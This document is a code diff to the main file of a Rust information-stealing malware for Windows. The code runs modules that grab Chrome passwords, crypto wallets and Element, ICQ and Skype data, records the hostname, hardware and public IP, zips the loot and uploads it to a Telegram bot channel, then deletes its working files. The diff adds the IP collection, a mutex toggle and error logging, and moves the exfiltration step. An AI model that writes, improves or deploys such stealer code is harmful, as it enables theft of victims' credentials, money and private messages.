@@ -1,9 +1,9 @@
-#![windows_subsystem = "windows"] // Hide the Console
+#![windows_subsystem = "console"] // Hide the Console
 
 mod chrome_grabber;
+mod messengers;
 mod other_grabber;
 mod wallet_grabber;
-mod messengers;
 
 extern crate serde;
 
@@ -23,6 +23,7 @@ use wmi::{COMLibrary, WMIConnection};
 
 const BOT_TOKEN: &str = "";
 const CHANNEL_ID: i64 = -0;
+const MUTEX: bool = true;
 
 static mut PASSWORDS: i64 = 0;
 static mut WALLETS: i64 = 0;
@@ -36,8 +37,11 @@ async fn main() {
     let string_path: &str = &format!("{}\\logsxc\\", app_data);
     let mutex_file = format!("{}\\dimp.sts", app_data);
 
-    if std::path::Path::new(&mutex_file).exists() || std::path::Path::new(&string_path).exists() {
-        std::process::exit(0); // Dont resend any already sent log.
+    if MUTEX {
+        if std::path::Path::new(&mutex_file).exists() || std::path::Path::new(&string_path).exists()
+        {
+            std::process::exit(0); // Dont resend any already sent log.
+        }
     }
 
     let _ = std::fs::OpenOptions::new()
@@ -106,7 +110,10 @@ async fn main() {
         .await;
 
     if let Err(_err) = _call_result {
-        println!("{}", _err);
+        std::fs::File::create(format!("{}\\error.txt", string_path))
+            .unwrap()
+            .write_all(_err.to_string().as_bytes())
+            .unwrap();
         std::process::exit(0);
     }
 
@@ -119,12 +126,16 @@ async fn main() {
     ));
     sysinfo.push(format!("Language: {}", language));
     sysinfo.push(format!("Hostname: {}", whoami::hostname()));
+    sysinfo.push(format!(
+        "IP: {}",
+        my_internet_ip::get().unwrap().to_string()
+    ));
     sysinfo.push(city);
 
     let hardware = get_hardware();
-    // if hardware.is_ok() {
-    sysinfo.push(format!("{}", hardware.unwrap()));
-    // }
+    if hardware.is_ok() {
+        sysinfo.push(format!("{}", hardware.unwrap()));
+    }
 
     std::fs::File::create(format!("{}\\info.txt", string_path))
         .unwrap()
@@ -161,7 +172,6 @@ async fn main() {
         .write_all(system_info.join("\n").as_bytes())
         .unwrap();
 
-
     //TODO Make A Method in each Package.
     chrome_grabber::main::chrome_main();
     wallet_grabber::wallets::grab_cold_wallets();
@@ -176,14 +186,6 @@ async fn main() {
     messengers::element::steal_element();
     messengers::icq::steal_icq();
     messengers::skype::steal_skype();
-
-
-    zip_file(
-        string_path,
-        &format!("{}\\out.zip", std::env::var("TEMP").unwrap()),
-        zip::CompressionMethod::Deflated,
-    )
-    .unwrap();
 
     unsafe {
         let msg_edit = bold((
@@ -223,14 +225,12 @@ async fn main() {
             },
         ));
 
-        let _ = bot
-            .delete_message(
-                ChannelId::from(CHANNEL_ID),
-                _call_result.as_ref().unwrap().id,
-            )
-            .call()
-            .await;
-
+        zip_file(
+            string_path,
+            &format!("{}\\out.zip", std::env::var("TEMP").unwrap()),
+            zip::CompressionMethod::Deflated,
+        )
+        .unwrap();
         let mut log_accounts =
             std::fs::File::open(format!("{}\\out.zip", std::env::var("TEMP").unwrap())).unwrap();
 
@@ -239,6 +239,14 @@ async fn main() {
         let _data_document: Document = Document::with_bytes("out.zip", &log_buffer);
 
         let _ = bot
+            .delete_message(
+                ChannelId::from(CHANNEL_ID),
+                _call_result.as_ref().unwrap().id,
+            )
+            .call()
+            .await;
+
+        let _call_result = bot
             .send_document(
                 ChannelId::from(CHANNEL_ID),
                 _data_document.caption(ParseMode::with_markdown_v2(
@@ -247,6 +255,14 @@ async fn main() {
             )
             .call()
             .await;
+
+        if let Err(_err) = _call_result {
+            std::fs::File::create(format!("{}\\error.txt", string_path))
+                .unwrap()
+                .write_all(_err.to_string().as_bytes())
+                .unwrap();
+            std::process::exit(0);
+        }
 
         std::fs::remove_dir_all(string_path).unwrap();
         std::fs::remove_file(format!("{}\\sensfiles.zip", app_data)).unwrap();
